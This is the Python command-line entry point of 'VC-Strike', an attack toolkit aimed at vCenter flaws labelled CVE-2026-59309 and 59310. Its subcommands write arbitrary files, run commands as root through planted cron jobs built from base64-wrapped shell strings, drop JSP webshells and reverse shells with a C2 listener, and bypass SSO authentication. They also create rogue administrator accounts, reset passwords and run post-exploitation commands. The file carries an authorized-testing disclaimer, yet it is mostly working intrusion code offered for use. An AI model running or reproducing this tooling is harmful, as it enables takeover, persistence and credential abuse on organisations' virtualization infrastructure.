"""VC-Strike CLI —— 全功能命令行入口（与 GUI 等价）。

无参数运行 = 启动 GUI。

  scan          批量指纹（仅探测）
  check59310    CVE-2026-59310 非破坏写入验证
  write59310    CVE-2026-59310 任意文件写
  exec59310     CVE-2026-59310 RCE（VAMI 回显 / 落盘）
  webshell      JSP WebShell 植入
  revshell      反弹 shell 植入 + 交互监听
  listen        多会话 C2 控制台
  check59309    CVE-2026-59309 SRP 机制探测（--bypass 执行完整绕过）
  ldap59309     SSO 目录操作（枚举/建管/改密/查询）
  postex        后渗透（信息/凭据/IOC 快扫/自定义命令）
  chain         一键打通：59310/59309 联动交付 SSO 管理员
  mgmt          vSphere 资产盘点（REST 只读）
  vops          vSphere 单台 VM 操作（详情/快照/电源，写操作需确认）
  selftest      自检
  gui           图形界面
"""
import argparse
import base64
import csv
import ssl
import sys
import time

from . import __version__, logutil
from .util import rand_name
from .recon import probe_target
from .syslog59310 import (build_rfc5424, check_write, write_file, plant_cron,
                          rce_readback, drop_webshell, traversal_app,
                          traversal_host, plant_revshell)
from .srp59309 import srp_bypass_bind
from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
                      op_modify, collect_search, parse_ldap_result, has_srp)
from .postex import POSTEX_ACTIONS


def _proto_args(sp):
    sp.add_argument("--port", type=int, default=514, help="syslog 端口（默认 514）")
    sp.add_argument("--proto", choices=["udp", "tcp", "tls"], default="udp",
                    help="syslog 传输协议（默认 udp）")


def build_parser():
    p = argparse.ArgumentParser(
        prog="vc-strike",
        description="VC-Strike — vCenter CVE-2026-59309/59310 授权渗透测试套件 v%s\n"
                    "作者: chu0119 | 仓库: https://github.com/chu0119/vc-strike"
                    % __version__,
        epilog="仅限已获书面授权的测试/研究使用。无参数运行启动 GUI。")
    p.add_argument("--version", action="version", version="vc-strike " + __version__)
    sub = p.add_subparsers(dest="cmd")

    sub.add_parser("gui", help="图形界面（默认）")
    sub.add_parser("selftest", help="自检（AES/BER/SRP 构造）")

    s = sub.add_parser("scan", help="批量指纹（仅探测，不利用）")
    s.add_argument("hosts", help="逗号分隔，或 @file.txt")
    s.add_argument("--out", default=None, help="导出 CSV 路径")
    s.add_argument("--proxy", default=None, help="HTTP 探测代理（如 http://127.0.0.1:7897）")
    s.add_argument("--timeout", type=int, default=6)

    s = sub.add_parser("check59310", help="CVE-2026-59310 非破坏写入验证")
    s.add_argument("host")
    _proto_args(s)
    s.add_argument("--name", default=None, help="唯一标识（默认随机）")

    s = sub.add_parser("write59310", help="CVE-2026-59310 任意文件写")
    s.add_argument("host")
    s.add_argument("--path", required=True, help="目标路径（自动追加 -syslog.log）")
    g = s.add_mutually_exclusive_group()
    g.add_argument("--content", default=None)
    g.add_argument("--file", default=None, help="从本地文件读内容")
    s.add_argument("--vector", choices=["app", "host"], default="app")
    _proto_args(s)

    s = sub.add_parser("exec59310", help="CVE-2026-59310 RCE")
    s.add_argument("host")
    s.add_argument("-c", "--cmd", required=True)
    s.add_argument("--mode", choices=["readback", "plain"], default="readback",
                   help="readback=VAMI 回显（默认），plain=输出落目标 /tmp")
    s.add_argument("--vami-port", type=int, default=5480)
    s.add_argument("--wait", type=int, default=240)
    s.add_argument("--no-b64", action="store_true", help="不用 base64 封装命令")
    s.add_argument("--proxy", default=None)
    _proto_args(s)

    s = sub.add_parser("webshell", help="JSP WebShell 植入（statsreport）")
    s.add_argument("host")
    s.add_argument("--name", default=None)
    _proto_args(s)

    s = sub.add_parser("revshell", help="反弹 shell：植入 + 交互监听")
    s.add_argument("host")
    s.add_argument("--lhost", required=True)
    s.add_argument("--lport", type=int, default=4444)
    s.add_argument("--method", choices=["bash", "python"], default="bash")
    _proto_args(s)

    s = sub.add_parser("listen", help="多会话 C2 控制台（独立于植入）")
    s.add_argument("--ports", default="4444", help="逗号分隔监听端口")

    s = sub.add_parser("check59309", help="CVE-2026-59309 SRP 机制探测")
    s.add_argument("host")
    s.add_argument("--port", type=int, default=389, choices=[389, 636, 2020])
    s.add_argument("--tls", action="store_true")
    s.add_argument("--bypass", action="store_true",
                   help="执行完整认证绕过（以只读 namingContexts 验证）")
    s.add_argument("--identity", default="administrator@vsphere.local")
    s.add_argument("--policy", choices=["auto", "full", "plain"], default="auto")

    s = sub.add_parser("ldap59309", help="CVE-2026-59309 绕过后的 SSO 目录操作")
    s.add_argument("host")
    s.add_argument("action", choices=["enum-users", "admins", "add-admin",
                                      "reset-pw", "search"])
    s.add_argument("--port", type=int, default=389, choices=[389, 636, 2020])
    s.add_argument("--tls", action="store_true")
    s.add_argument("--identity", default="administrator@vsphere.local")
    s.add_argument("--policy", choices=["auto", "full", "plain"], default="auto")
    s.add_argument("--base", default=None, help="默认自动读 namingContexts")
    s.add_argument("--user", default=None, help="add-admin 用户名")
    s.add_argument("--pass", dest="password", default=None, help="add-admin 密码")
    s.add_argument("--dn", default=None, help="reset-pw 目标 DN")
    s.add_argument("--filter", default="(objectClass=*)", help="search 过滤器")
    s.add_argument("--scope", choices=["base", "one", "sub"], default="sub")

    s = sub.add_parser("postex", help="后渗透（经 59310 RCE + VAMI 回显）")
    s.add_argument("host")
    s.add_argument("action", choices=list(POSTEX_ACTIONS.keys()) + ["cmd"])
    s.add_argument("--cmdline", default=None, help="action=cmd 时的自定义命令")
    s.add_argument("--vami-port", type=int, default=5480)
    s.add_argument("--wait", type=int, default=240)
    s.add_argument("--proxy", default=None)
    _proto_args(s)

    s = sub.add_parser("chain", help="一键打通：59310/59309 联动交付 SSO 管理员")
    s.add_argument("host")
    s.add_argument("--user", default=None, help="交付账户名（默认自动生成）")
    s.add_argument("--pass", dest="password", default=None,
                   help="交付账户密码（默认自动生成强密码）")
    s.add_argument("--skip-59310", dest="use_59310", action="store_false",
                   help="跳过 59310 机器账户路径")
    s.add_argument("--skip-59309", dest="use_59309", action="store_false",
                   help="跳过 59309 SRP 路径")
    s.add_argument("--no-inventory", dest="inventory", action="store_false",
                   help="交付后不做 vSphere 资产盘点")
    s.add_argument("--report", default=None, help="导出 Markdown 测试报告路径")
    s.add_argument("--proto", choices=["udp", "tcp", "tls"], default="udp")
    s.add_argument("--port", type=int, default=514)
    s.add_argument("--vami-port", type=int, default=5480)
    s.add_argument("--wait", type=int, default=200)
    s.add_argument("--proxy", default=None)

    s = sub.add_parser("mgmt", help="vSphere 资产盘点（REST 只读，用合法 SSO 账户）")
    s.add_argument("host")
    s.add_argument("--user", required=True, help="SSO 账户（如 user@vsphere.local）")
    s.add_argument("--pass", dest="password", required=True)
    s.add_argument("--port", type=int, default=443)

    s = sub.add_parser("vops", help="vSphere 单台 VM 操作（只读详情/快照/电源）")
    s.add_argument("host")
    s.add_argument("--user", required=True)
    s.add_argument("--pass", dest="password", required=True)
    s.add_argument("--port", type=int, default=443)
    s.add_argument("--action", required=True,
                   choices=["vms", "detail", "disks", "snapshots", "export",
                            "power-on", "power-off", "suspend", "reset"],
                   help="vms=清单；detail/disks/snapshots/export 需 --vm")
    s.add_argument("--vm", default=None, help="VM 名称（vms 可列出；export 用名称）")
    s.add_argument("--out", default=None, help="export 的目标目录")
    s.add_argument("--ovftool", default=None, help="ovftool 路径（默认自动检测）")
    return p


def _net(a):
    return a.host, a.port, a.proto in ("tcp", "tls"), a.proto == "tls"


def _load_hosts(spec):
    if spec.startswith("@"):
        with open(spec[1:], encoding="utf-8", errors="replace") as f:
            return [x.strip() for x in f if x.strip() and not x.startswith("#")]
    return [x.strip() for x in spec.split(",") if x.strip()]


def _ldap_open(a, log=print):
    tls = getattr(a, "tls", False) or a.port == 636
    conn = connect_ldap(a.host, a.port, tls, 8)
    r = srp_bypass_bind(conn, a.identity, a.policy, log=log)
    if not r.ok:
        print("[-] %s" % r.msg)
        conn.close()
        sys.exit(2)
    print("[+] %s" % r.msg)
    print("[i] 安全层: %s" % r.info["layer"])
    conn.send_op(op_search("", scope=0, attrs=["namingContexts"]))
    entries, _ = collect_search(conn)
    ncs = []
    for _dn, at in entries:
        ncs += at.get("namingContexts", [])
    base = getattr(a, "base", None)
    a.base = base or (ncs[0] if ncs else "dc=vsphere,dc=local")
    print("[+] Base DN: %s" % a.base)
    return conn


# ---------------- 子命令实现 ----------------

def cmd_scan(a):
    rows = []
    for h in _load_hosts(a.hosts):
        try:
            r = probe_target(h, proxy=a.proxy, timeout=a.timeout, log=print)
        except Exception as e:
            print("[!] %s 探测异常: %r" % (h, e))
            continue
        rows.append(r)
        print("[+] %-20s %s" % (h, r["conclusion"]))
    if a.out and rows:
        cols = ("host", "443", "5480", "514tcp", "1514", "389", "636", "2020",
                "api", "mechs", "nc", "conclusion")
        with open(a.out, "w", newline="", encoding="utf-8-sig") as fp:
            w = csv.writer(fp)
            w.writerow(cols)
            for r in rows:
                w.writerow([r["host"]] +
                           [("Y" if r.get(c) else "") if isinstance(r.get(c), bool)
                            else (r.get(c) or "") for c in cols[1:]])
        print("[+] 已导出: %s" % a.out)
    return 0


def cmd_check59310(a):
    name = a.name or rand_name()
    host, port, tcp, tls = _net(a)
    path, pkt = check_write(host, port, name, tcp=tcp, tls=tls)
    print("[*] 目标: %s:%d/%s" % (host, port, a.proto))
    print("[d] 报文: %r" % pkt)
    print("[+] 已发送。目标上验证: ls -la %s" % path)
    print("[i] 清理: rm -f %s" % path)
    return 0


def cmd_write59310(a):
    if a.file:
        content = open(a.file, "r", encoding="utf-8", errors="replace").read()
    else:
        content = a.content or ""
    host, port, tcp, tls = _net(a)
    written, pkt = write_file(host, port, a.path, content, vector=a.vector,
                              tcp=tcp, tls=tls)
    print("[+] 已发送写入 → 预期文件 %s" % written)
    print("[d] %r" % pkt)
    return 0


def cmd_exec59310(a):
    host, port, tcp, tls = _net(a)
    if a.mode == "plain":
        name = rand_name()
        out = "/tmp/cve59310_%s.txt" % name
        if not a.no_b64:
            b64 = base64.b64encode(a.cmd.encode()).decode()
            body = "/bin/sh -c 'echo %s | base64 -d | /bin/sh > %s 2>&1'" % (b64, out)
        else:
            body = ("/bin/sh -c '{ %s; } > %s 2>&1'"
                    % (a.cmd.replace("'", "'\\''"), out))
        planted, _ = plant_cron(host, port, body, name, tcp=tcp, tls=tls)
        print("[+] 已植入 %s（约 60s 内 root 执行）" % planted)
        print("[i] 目标读取: cat %s" % out)
        return 0
    ok, text = rce_readback(host, port, a.cmd, rand_name(6), tcp=tcp, tls=tls,
                            vami_port=a.vami_port, timeout=a.wait, proxy=a.proxy,
                            use_b64=not a.no_b64, poll_cb=print)
    if ok:
        print("[+] 输出:\n%s" % text)
        return 0
    print("[-] %s" % text)
    return 1


def cmd_webshell(a):
    host, port, tcp, tls = _net(a)
    name = a.name or rand_name()
    written, planted, urls = drop_webshell(host, port, name, tcp=tcp, tls=tls)
    print("[+] 写入 %s；cron 落地 %s" % (written, planted))
    for u in urls:
        print("[+] 访问: %s" % u)
    return 0


def cmd_revshell(a):
    from .c2 import SessionManager, interactive_loop
    host, port, tcp, tls = _net(a)
    planted, _ = plant_revshell(host, port, a.lhost, a.lport, a.method,
                                tcp=tcp, tls=tls)
    print("[+] 已植入反弹 %s:%d → %s（crond 约 60s 触发）" %
          (a.lhost, a.lport, planted))
    mgr = SessionManager()
    mgr.add_listener(a.lport)
    try:
        interactive_loop(mgr)
    finally:
        pass
    return 0


def cmd_listen(a):
    from .c2 import SessionManager, interactive_loop
    mgr = SessionManager()
    for p in [int(x) for x in a.ports.split(",") if x.strip()]:
        mgr.add_listener(p)
    interactive_loop(mgr)
    return 0


def cmd_check59309(a):
    tls = a.tls or a.port == 636
    try:
        dse = root_dse_probe(a.host, a.port, tls, 8)
    except Exception as e:
        print("[-] rootDSE 失败: %r" % e)
        return 1
    print("[+] SASL 机制: %s" % (",".join(dse["mechs"]) or "(无)"))
    print("[+] namingContexts: %s" % (";".join(dse["namingContexts"]) or "(无)"))
    if not has_srp(dse["mechs"]):
        print("[-] 未通告 SRP（可能已修复/禁用/需认证）")
        return 1
    if not a.bypass:
        print("[+] 通告 SRP 机制 → 攻击面暴露。加 --bypass 执行完整绕过验证。")
        return 0
    conn = connect_ldap(a.host, a.port, tls, 8)
    try:
        r = srp_bypass_bind(conn, a.identity, a.policy, log=print)
        if not r.ok:
            print("[-] %s" % r.msg)
            return 1
        print("[+] %s（安全层 %s）" % (r.msg, r.info["layer"]))
        conn.send_op(op_search("", scope=0, attrs=["namingContexts"]))
        entries, _ = collect_search(conn)
        for dn, at in entries:
            print("[+] 以 %s 身份读取: %s %s" % (a.identity, dn, at.get("namingContexts")))
        return 0
    finally:
        conn.close()


def cmd_ldap59309(a):
    conn = _ldap_open(a)
    try:
        base = a.base
        if a.action == "enum-users":
            conn.send_op(op_search("cn=Users," + base, scope=2,
                                   ffilter="(objectClass=person)",
                                   attrs=["cn", "sAMAccountName", "userPrincipalName"]))
            entries, code = collect_search(conn)
            for dn, at in entries:
                print("  %s  %s" % (at.get("userPrincipalName", [""])[0], dn))
            print("[+] 共 %d 个用户对象 (code=%s)" % (len(entries), code))
        elif a.action == "admins":
            conn.send_op(op_search("cn=Administrators,cn=Builtin," + base, scope=0,
                                   attrs=["member"]))
            entries, _ = collect_search(conn)
            for _dn, at in entries:
                for m in at.get("member", []):
                    print("[admin] %s" % m)
        elif a.action == "add-admin":
            import re as _re
            user, pw = a.user, a.password
            if not user or not pw:
                print("[-] 需要 --user/--pass")
                return 2
            if not _re.fullmatch(r"[A-Za-z0-9_.-]{3,32}", user):
                print("[-] 用户名仅允许字母数字._-，3-32 位")
                return 2
            dom = base.replace("dc=", "").replace(",", ".").replace(" ", "")
            udn = "cn=%s,cn=Users,%s" % (user, base)
            conn.send_op(op_add(udn, [
                ("objectClass", ["top", "person", "organizationalPerson", "user"]),
                ("cn", [user]), ("sn", [dom]), ("givenName", [user]),
                ("sAMAccountName", [user]), ("userPrincipalName", ["%s@%s" % (user, dom)]),
                ("uid", [user]), ("userPassword", [pw])]))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            if code != 0:
                print("[-] 创建失败 code=%s %s" % (code, diag.decode("utf-8", "replace")))
                return 1
            conn.send_op(op_modify("cn=Administrators,cn=Builtin," + base,
                                   [(0, "member", [udn])]))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            print("[+] %s（组操作 code=%s）登录 https://%s/ui 用户 %s@%s / %s" %
                  (udn, code, a.host, user, dom, pw))
            print("[i] 清理: ldapdelete 该账户，或再次绕过后 delete")
        elif a.action == "reset-pw":
            if not a.dn or not a.password:
                print("[-] 需要 --dn/--pass")
                return 2
            conn.send_op(op_modify(a.dn, [(2, "userPassword", [a.password])]))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            print("[%s] 重置 %s code=%s %s" %
                  ("+" if code == 0 else "-", a.dn, code,
                   diag.decode("utf-8", "replace")))
        elif a.action == "search":
            scope = {"base": 0, "one": 1, "sub": 2}[a.scope]
            conn.send_op(op_search(base, scope=scope, ffilter=a.filter, attrs=["*"]))
            entries, code = collect_search(conn)
            for dn, at in entries[:400]:
                print("DN: " + dn)
                for k in sorted(at):
                    print("  %s: %s" % (k, "; ".join(at[k][:5])))
            print("[+] %d 条 (code=%s)" % (len(entries), code))
        return 0
    finally:
        conn.close()


def cmd_chain(a):
    from .chain import run_chain
    r = run_chain(a.host, user=a.user, password=a.password,
                  use_59310=a.use_59310, use_59309=a.use_59309,
                  syslog_port=a.port, proto=a.proto, vami_port=a.vami_port,
                  proxy=a.proxy, rce_wait=a.wait, inventory=a.inventory,
                  log=print)
    print("\n" + r.card)
    if a.report:
        with open(a.report, "w", encoding="utf-8") as fp:
            fp.write(r.report_markdown())
        print("[+] 报告已导出: %s" % a.report)
    return 0 if r.ok else 1


def cmd_mgmt(a):
    from .mgmt import gather_inventory, MgmtError
    try:
        print(gather_inventory(a.host.split(":")[0], a.user, a.password,
                               port=a.port))
        return 0
    except MgmtError as e:
        print("[-] %s" % e)
        return 1


def cmd_vops(a):
    from .mgmt import VCenterRest, MgmtError
    host = a.host.split(":")[0]
    c = VCenterRest(host, a.port)
    try:
        c.login(a.user, a.password)
        if a.action == "vms":
            try:
                for name, power, cpu, mem, vmid in c.vms():
                    print("%-28s %-12s vCPU=%-3s mem=%-7s %s"
                          % (name, power, cpu, mem, vmid))
            except MgmtError as e:
                print("[-] VM 清单端点失败（6.x REST 支持不完整时属预期）: %s" % e)
                print("[*] 降级为全端点盘点：")
                c2 = VCenterRest(host, a.port)
                c2.login(a.user, a.password)
                try:
                    print(c2.summary())
                finally:
                    c2.logout()
        elif a.action in ("detail", "disks", "snapshots"):
            if not a.vm:
                print("[-] 需要 --vm")
                return 2
            if a.action == "detail":
                for k, v in c.vm_detail(a.vm).items():
                    print("%s: %s" % (k, v))
            elif a.action == "disks":
                for r in c.vm_disks(a.vm):
                    print(" | ".join(r))
            else:
                snaps = c.vm_snapshots(a.vm)
                if not snaps:
                    print("快照：无")
                for sn in snaps:
                    print(" | ".join(sn))
        elif a.action == "export":
            if not a.vm or not a.out:
                print("[-] export 需要 --vm 与 --out（目标目录）")
                return 2
            if a.vm:
                vmid = next((r[4] for r in c.vms() if r[0] == a.vm), None)
                if vmid and c.power_get(vmid) == "POWERED_ON" \
                        and not a.auto_power:
                    print("[!] VM 处于开机状态——OVF 导出需要关机。")
                    print("[i] 自动关机/恢复请加 --auto-power；或手工关机后重试。")
                    return 2
            ok, detail = c.export_vm_ovftool(
                a.vm, a.out, ovftool=a.ovftool, auto_power=a.auto_power,
                power_confirm_cb=None,
                log=lambda s: print("    " + s))
            print("[%s] %s" % ("+" if ok else "-", detail))
            return 0 if ok else 1
        else:                                    # 电源操作
            if not a.vm:
                print("[-] 需要 --vm")
                return 2
            act = {"power-on": "start", "power-off": "stop",
                   "suspend": "suspend", "reset": "reset"}[a.action]
            if act in ("stop", "reset", "suspend"):
                try:
                    ok = input("对 %s 执行 %s？输入 VM 标识确认: " % (a.vm, act))
                except (EOFError, KeyboardInterrupt):
                    ok = None
                if ok != a.vm:
                    print("[-] 已取消（确认输入不匹配或中断）")
                    return 2
            ok, detail = c.power_set(a.vm, act)
            print("[%s] 电源[%s] %s → %s" % ("+" if ok else "-", a.action,
                                             a.vm, detail))
            if ok:
                print("[审计] 电源写操作已执行（action=%s vm=%s）" % (act, a.vm))
            return 0 if ok else 1
        return 0
    except MgmtError as e:
        print("[-] %s" % e)
        return 1
    finally:
        c.logout()


def cmd_postex(a):
    if a.action == "cmd":
        if not a.cmdline:
            print("[-] 需要 --cmdline")
            return 2
        name, cmd = "自定义", a.cmdline
    else:
        name, cmd = POSTEX_ACTIONS[a.action]
    host, port, tcp, tls = _net(a)
    print("[*] 后渗透[%s] → %s : %s" % (name, host, cmd))
    ok, text = rce_readback(host, port, cmd, rand_name(6), tcp=tcp, tls=tls,
                            vami_port=a.vami_port, timeout=a.wait, proxy=a.proxy,
                            poll_cb=print)
    if ok:
        print("[+] 输出:\n%s" % text)
        return 0
    print("[-] %s" % text)
    return 1


def run_selftest():
    from .selftest import run
    return 0 if run() else 1


def cmd_gui(_a):
    from .gui import run_gui
    run_gui()
    return 0


def main(argv=None):
    if argv is None:
        argv = sys.argv[1:]
    # 无参数 → GUI（GUI 启动器自行开启运行日志）
    if not argv:
        return cmd_gui(None)
    p = build_parser()
    a = p.parse_args(argv)
    if a.cmd == "gui":
        return cmd_gui(a)
    # CLI 模式：全程 print 输出与异常同步进日志文件（exe 同目录）
    logutil.start("cli")
    logutil.install_stdout_tee()
    logutil.install_excepthook()
    safe = list(argv)
    for i, tok in enumerate(safe):
        if tok.lower() in ("--pass", "--password") and i + 1 < len(safe):
            safe[i + 1] = "***"
        if tok.lower().startswith(("--pass=", "--password=")):
            safe[i] = tok.split("=", 1)[0] + "=***"
    logutil.write("i", "argv: %s" % " ".join(safe))
    try:
        if a.cmd == "selftest":
            rc = run_selftest()
        else:
            rc = _dispatch(a)
    finally:
        logutil.finish()
    return rc


def _dispatch(a):
    fn = {"scan": cmd_scan, "check59310": cmd_check59310,
          "write59310": cmd_write59310, "exec59310": cmd_exec59310,
          "webshell": cmd_webshell, "revshell": cmd_revshell,
          "listen": cmd_listen, "check59309": cmd_check59309,
          "ldap59309": cmd_ldap59309, "postex": cmd_postex,
          "chain": cmd_chain, "mgmt": cmd_mgmt, "vops": cmd_vops}[a.cmd]
    try:
        return fn(a)
    except (ConnectionError, OSError, ValueError, ssl.SSLError) as e:
        print("[-] 错误: %s" % e)
        return 1
